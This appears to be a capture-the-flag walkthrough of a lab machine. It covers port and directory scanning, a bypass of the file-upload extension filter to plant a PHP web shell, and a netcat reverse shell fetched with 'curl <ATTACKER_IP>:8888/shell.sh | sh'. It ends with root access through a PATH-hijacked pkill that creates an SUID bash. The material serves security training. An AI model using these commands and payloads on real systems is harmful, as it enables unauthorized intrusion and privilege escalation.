# Scenario

The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

# Enumeration

## \[+] 10.10.16.139 - hacker.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.16.139 hacker.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.16.139
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] hacker.thm

Not much to do here, so we'll do some directory/file fuzzing using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt):

```sh
feroxbuster -u http://hacker.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

After some time we'll find a page that a hacker would also find interesting:

![50119cc208f034241f13f41d6cbaf622.png](/resources/623164825fec432b8dd52457aa810ba2.png)

### \[-] hacker.thm/upload.php

When we visit this page, we find a note left by the hacker:

```sh
curl -vvv http://hacker.thm/upload.php
```

![5aa459518294677f81f889cdbf9ef238.png](/resources/07d6bb5e20b3422fb34c1be950040e4d.png)

The hacker is pointing out the method used to filter the file upload function that the developer wrote. In the highlighted line, the code is only looking to see if the filename has "`.pdf`" after it and if it does, the file will be uploaded.

From past experience, in this situation we would try to upload a [PHP web shell](https://github.com/JohnTroony/php-webshells) where we bypass the file upload filter by changing the filename from something like `shell.php` to `shell.pdf.php`.

Checking back to the note the hacker left, we will see that the files go to the `cvs/` directory. Let's see if we will find anything if we visit `hacker.thm/cvs/shell.pdf.php`:

```sh
curl -vvv http://hacker.thm/cvs/shell.pdf.php
```

![6ff3486731520141529ca650aa23a62d.png](/resources/4eff5a0cedc549b5843f3c2d91453c4c.png)

Typically, the way we would interact with a web shell like this is to send commands via the `cmd` parameter. We can try this by testing the `id` command and request the following URL:

```sh
curl -vvv http://hacker.thm/cvs/shell.pdf.php?cmd=id
```

![d7703f2414ed9d60249ccf423c734589.png](/resources/7c67ec2f55294cfd9cd2a75935c63f79.png)

# Initial Foothold

### \[-] www-data\@b2r

From here, we will first need to create a bash script with the reverse shell command:

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Save it as `shell.sh` then host it using Python:

```sh
python3 -m http.server 8888
```

Next, start a [Netcat](https://linux.die.net/man/1/nc) listener:

```sh
nc -nvlp 4444
```

The command we will send to the web shell will download our bash script, pipe it to bash to run the script and we should get a connection back to our Netcat listener. The command needs to be URL encoded so we can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)\&input=Y3VybCA8QVRUQUNLRVJfSVA%2BOjg4ODgvc2hlbGwuc2ggfCBzaA) to encode it:

```plaintext
curl <ATTACKER_IP>:8888/shell.sh | sh
```

The entire curl command will look something like this:

```sh
curl -vvv http://hacker.thm/cvs/shell.pdf.php?cmd=curl%20%3CATTACKER%5FIP%3E%3A8888%2Fshell%2Esh%20%7C%20sh
```

After sending the command we should get a connection back on our listener:

![8c8c45f7948ffa82591e63f88d863256.png](/resources/7ccfb0ffa73f40de8dc766eb39d6e02f.png)

We can find the user flag in `/home/lachlan/user.txt`:

```
cd /home/lachlan
ls -lah
cat user.txt
```

# Privilege Escalation

### \[-] lachlan\@b2r

Another interesting file in `/home/lachlan/` is the `.bash_history` file, which is usually cleared out. This file has a history of all the commands that were ran in the bash shell. We can just `cat` the contents to find the password for the user `lachlan`:

```sh
cat .bash_history
```

![952190641cddba60b991a2adc7356039.png](/resources/83d8c0ae3a034fa7b7ee26054ac9bb6c.png)

Now we can use the [su](https://linux.die.net/man/1/su) command and enter the password when prompted:

```sh
su lachlan
```

![34ab496da3de6babfd876792e6994cd9.png](/resources/6583fd67becd4afcac7976fdcaf4847a.png)

### \[-] root\@b2r

From here, I tried uploading `socat` static binary to get a stable shell, but a few seconds after connecting, I was disconnected with the message "nope":

![7b02117ee2eb5cd35c9889745b64acce.png](/resources/13a8e0af713b4f5facb64ff1c107e7d6.png)

So, I went back to the connection I already had open and ran `ps aux` to see the currently running processes where we will find a task that is killing the connection to our reverse shell:

![e74998aedb88596feaadd129a7f0bc51.png](/resources/d25df21f28f84aa092e41ff2df7db812.png)

The task is being ran by the user `root` and it also is running a binary without the full file path, `pkill`. Since the file path for `pkill` binary is not specificed, we can create our own binary with the same name, but in the directory of the script. Since our binary is closest in the hierarchy, it will be called first.

We will have to create a one-line command that we can copy and paste as soon as we connect so that the scheduled task will create a copy of the bash shell and set the [SUID bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) so we can run it while keeping root privileges.

We will create our own `pkill` in the `bin` directory using `echo` with the command to create our SUID bash shell:

```sh
echo "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash" > bin/pkill; chmod +x bin/pkill
```

Let's start by connecting via SSH, but before pressing the `Enter` key when sending the password, we will copy the above command to our clipboard so that when we do press the `Enter` key, we can paste in the command and send it right after:

```ssh
ssh lachlan@$RHOSTS
```

After sending the command, the console will still echo "nope", but if we check the directory using `ls`, we will find our copy of bash with the SUID bit set:

![47418f42d55c1af73898f180e6987db3.png](/resources/9b0286d4979a4c2189763cad12bf9492.png)

When we run this copy of bash with the `-p` flag enabled, we will have our effective UID set to `root`:

![004358c9e638884fe49e9ce03958c117.png](/resources/c5c8983d601b4833b274e78b20725cfc.png)

We can find the root flag in `/root/root.txt`:

```sh
cd root
ls -lah
cat root.txt
```
